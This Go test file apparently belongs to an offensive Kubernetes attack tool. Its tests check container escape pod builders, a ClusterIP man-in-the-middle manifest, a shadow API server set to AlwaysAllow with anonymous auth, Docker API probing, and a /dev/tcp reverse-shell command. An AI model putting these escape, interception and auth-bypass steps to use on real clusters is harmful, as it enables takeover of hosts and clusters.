package handler

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/gin-gonic/gin"
	corev1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"sigs.k8s.io/yaml"
)

func TestDockerProbeTargets(t *testing.T) {
	targets := dockerProbeTargets()
	if len(targets) < 2 {
		t.Fatalf("expected docker probe targets to include both default ports")
	}
	if targets[0].Port != 2375 || targets[0].Scheme != "http" {
		t.Fatalf("expected first target to probe http:// on 2375, got %#v", targets[0])
	}
	if targets[1].Port != 2376 || targets[1].Scheme != "https" {
		t.Fatalf("expected second target to probe https:// on 2376, got %#v", targets[1])
	}
}

func TestResolveMITMVictimIP(t *testing.T) {
	if got := resolveMITMVictimIP(mitmRequest{VictimIP: "2.2.2.2", TargetIP: "1.1.1.1"}); got != "2.2.2.2" {
		t.Fatalf("expected victim_ip to take precedence, got %q", got)
	}
	if got := resolveMITMVictimIP(mitmRequest{TargetIP: "1.1.1.1"}); got != "1.1.1.1" {
		t.Fatalf("expected legacy target_ip to be used, got %q", got)
	}
	if got := resolveMITMVictimIP(mitmRequest{}); got != "1.1.1.1" {
		t.Fatalf("expected default victim IP, got %q", got)
	}
}

func TestBuildClusterIPMITMYAML(t *testing.T) {
	yaml := buildClusterIPMITMYAML("8.8.8.8", 8443)
	if !strings.Contains(yaml, "externalIPs:\n  - 8.8.8.8") {
		t.Fatalf("expected yaml to claim victim IP, got:\n%s", yaml)
	}
	if !strings.Contains(yaml, "traffic destined for 8.8.8.8:8443") {
		t.Fatalf("expected yaml comment to describe victim traffic, got:\n%s", yaml)
	}
}

func TestBuildEscapePodObjectUsesCustomCommand(t *testing.T) {
	pod := buildEscapePodObject(escapePodRequest{
		EscapeMode: "docker-sock",
		Namespace:  "default",
		Command:    "echo hello && sleep 5",
	})

	if got := pod.Spec.Containers[0].Args; len(got) != 2 || got[1] != "echo hello && sleep 5" {
		t.Fatalf("expected custom command in args, got %#v", got)
	}
}

func TestBuildEscapePodObjectCapDACUsesCapabilityInsteadOfPrivileged(t *testing.T) {
	pod := buildEscapePodObject(escapePodRequest{
		EscapeMode: "cap-dac",
		Namespace:  "default",
	})

	security := pod.Spec.Containers[0].SecurityContext
	if security == nil {
		t.Fatalf("expected security context")
	}
	if security.Privileged != nil && *security.Privileged {
		t.Fatalf("cap-dac mode should not be privileged")
	}
	if security.Capabilities == nil || len(security.Capabilities.Add) == 0 {
		t.Fatalf("expected CAP_DAC_READ_SEARCH capability to be added")
	}
	if security.Capabilities.Add[0] != corev1.Capability("DAC_READ_SEARCH") {
		t.Fatalf("expected DAC_READ_SEARCH capability, got %#v", security.Capabilities.Add)
	}
	if len(pod.Spec.Volumes) != 1 || pod.Spec.Volumes[0].HostPath == nil || pod.Spec.Volumes[0].HostPath.Path != "/etc" {
		t.Fatalf("expected /etc hostPath mount, got %#v", pod.Spec.Volumes)
	}
}

func TestEscapePodYAMLMarshalsToValidPod(t *testing.T) {
	pod := buildEscapePodObject(escapePodRequest{
		EscapeMode: "privileged",
		Namespace:  "kube-system",
		NodeName:   "node-a",
		Command:    "id; sleep 3600",
	})

	body, err := yaml.Marshal(pod)
	if err != nil {
		t.Fatalf("expected pod yaml to marshal, got error: %v", err)
	}

	jsonBody, err := yaml.YAMLToJSON(body)
	if err != nil {
		t.Fatalf("expected yaml to convert to json, got error: %v", err)
	}

	var decoded corev1.Pod
	if err := json.Unmarshal(jsonBody, &decoded); err != nil {
		t.Fatalf("expected marshaled yaml to decode as Pod, got error: %v", err)
	}
	if decoded.Spec.NodeName != "node-a" {
		t.Fatalf("expected nodeName to be preserved, got %q", decoded.Spec.NodeName)
	}
	if !decoded.Spec.HostPID || !decoded.Spec.HostNetwork || !decoded.Spec.HostIPC {
		t.Fatalf("expected privileged mode to enable host namespaces")
	}
	if len(decoded.Spec.Volumes) < 2 {
		t.Fatalf("expected host-root and docker-sock volumes, got %#v", decoded.Spec.Volumes)
	}
}

func TestRewriteShadowAPIServerArgsOverridesExpectedFlags(t *testing.T) {
	args, changed := rewriteShadowAPIServerArgs([]string{
		"--authorization-mode=Node,RBAC",
		"--secure-port=6443",
		"--anonymous-auth=false",
		"--etcd-servers=https://127.0.0.1:2379",
	})
	if !changed {
		t.Fatalf("expected existing auth/port args to be rewritten")
	}
	if !containsArgWithPrefix(args, "--authorization-mode=AlwaysAllow") {
		t.Fatalf("expected AlwaysAllow auth mode, got %#v", args)
	}
	if !containsArgWithPrefix(args, "--anonymous-auth=true") {
		t.Fatalf("expected anonymous-auth=true, got %#v", args)
	}
	if !containsArgWithPrefix(args, "--secure-port=9444") {
		t.Fatalf("expected secure-port=9444, got %#v", args)
	}
	if !containsArgWithPrefix(args, "--etcd-servers=https://127.0.0.1:2379") {
		t.Fatalf("expected etcd servers to be preserved, got %#v", args)
	}
}

func TestBuildShadowAPIServerPodCopiesKeyRuntimeData(t *testing.T) {
	source := corev1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "kube-apiserver-node1",
			Namespace: "kube-system",
			Labels: map[string]string{
				"component": "kube-apiserver",
				"tier":      "control-plane",
			},
		},
		Spec: corev1.PodSpec{
			NodeName:           "node-1",
			ServiceAccountName: "kube-apiserver",
			PriorityClassName:  "system-node-critical",
			Tolerations: []corev1.Toleration{{
				Key:      "node-role.kubernetes.io/control-plane",
				Operator: corev1.TolerationOpExists,
				Effect:   corev1.TaintEffectNoSchedule,
			}},
			Volumes: []corev1.Volume{
				hostPathTestVolume("etc-kubernetes", "/etc/kubernetes"),
				hostPathTestVolume("certs", "/etc/kubernetes/pki"),
			},
		},
	}
	container := corev1.Container{
		Name:    "kube-apiserver",
		Image:   "registry.k8s.io/kube-apiserver:v1.29.0",
		Command: []string{"kube-apiserver"},
		Args: []string{
			"--authorization-mode=Node,RBAC",
			"--anonymous-auth=false",
			"--secure-port=6443",
			"--etcd-servers=https://127.0.0.1:2379",
		},
		VolumeMounts: []corev1.VolumeMount{
			{Name: "etc-kubernetes", MountPath: "/etc/kubernetes", ReadOnly: true},
			{Name: "certs", MountPath: "/etc/kubernetes/pki", ReadOnly: true},
		},
	}

	shadow, warnings := buildShadowAPIServerPod(source, container)
	if len(warnings) != 0 {
		t.Fatalf("expected no warnings, got %#v", warnings)
	}
	if shadow.Name != "shadow-apiserver" || shadow.Namespace != "kube-system" {
		t.Fatalf("unexpected shadow pod identity: %s/%s", shadow.Namespace, shadow.Name)
	}
	if shadow.Spec.NodeName != "node-1" {
		t.Fatalf("expected source node to be preserved, got %q", shadow.Spec.NodeName)
	}
	if !shadow.Spec.HostNetwork {
		t.Fatalf("expected hostNetwork=true")
	}
	if shadow.Spec.DNSPolicy != corev1.DNSClusterFirstWithHostNet {
		t.Fatalf("expected DNSClusterFirstWithHostNet, got %q", shadow.Spec.DNSPolicy)
	}
	if len(shadow.Spec.Volumes) != 2 {
		t.Fatalf("expected referenced volumes to be copied, got %#v", shadow.Spec.Volumes)
	}
	if !containsArgWithPrefix(shadow.Spec.Containers[0].Args, "--secure-port=9444") {
		t.Fatalf("expected secure port override, got %#v", shadow.Spec.Containers[0].Args)
	}
	if !containsArgWithPrefix(shadow.Spec.Containers[0].Args, "--authorization-mode=AlwaysAllow") {
		t.Fatalf("expected auth mode override, got %#v", shadow.Spec.Containers[0].Args)
	}
}

func TestEvaluatePodSummaryDetectsSeccompDisabled(t *testing.T) {
	summary := evaluatePodSummary([]gin.H{
		{"check": "seccomp", "result": "Seccomp:\t0"},
		{"check": "docker_sock", "result": "not_found"},
	})

	if got := summary["risk_level"]; got != "medium" {
		t.Fatalf("expected medium risk for seccomp disabled, got %v", got)
	}
	risks, _ := summary["risks"].([]string)
	if len(risks) == 0 || !strings.Contains(risks[0], "seccomp=0") {
		t.Fatalf("expected seccomp risk to be reported, got %#v", risks)
	}
}

func TestEvaluatePodSummaryInfoOnlyDoesNotEscalateToHigh(t *testing.T) {
	summary := evaluatePodSummary([]gin.H{
		{"check": "sa_token", "result": "mounted"},
	})

	if got := summary["risk_level"]; got != "info" {
		t.Fatalf("expected info risk level for info-only findings, got %v", got)
	}
}

func TestAutoEscapeHostCommandAvoidsPlaceholderLHOST(t *testing.T) {
	if got := autoEscapeHostCommand("", ""); got != "echo ESCAPED_TO_HOST; id; hostname" {
		t.Fatalf("expected local confirmation command without placeholder host, got %q", got)
	}
	withReverse := autoEscapeHostCommand("10.0.0.8", "")
	if !strings.Contains(withReverse, "/dev/tcp/10.0.0.8/4444") {
		t.Fatalf("expected reverse-shell target to use provided host and default port, got %q", withReverse)
	}
	if !strings.Contains(withReverse, "ESCAPED_TO_HOST") {
		t.Fatalf("expected reverse-shell command to keep host escape evidence, got %q", withReverse)
	}
}

func hostPathTestVolume(name, path string) corev1.Volume {
	pathType := corev1.HostPathDirectory
	return corev1.Volume{
		Name: name,
		VolumeSource: corev1.VolumeSource{
			HostPath: &corev1.HostPathVolumeSource{
				Path: path,
				Type: &pathType,
			},
		},
	}
}
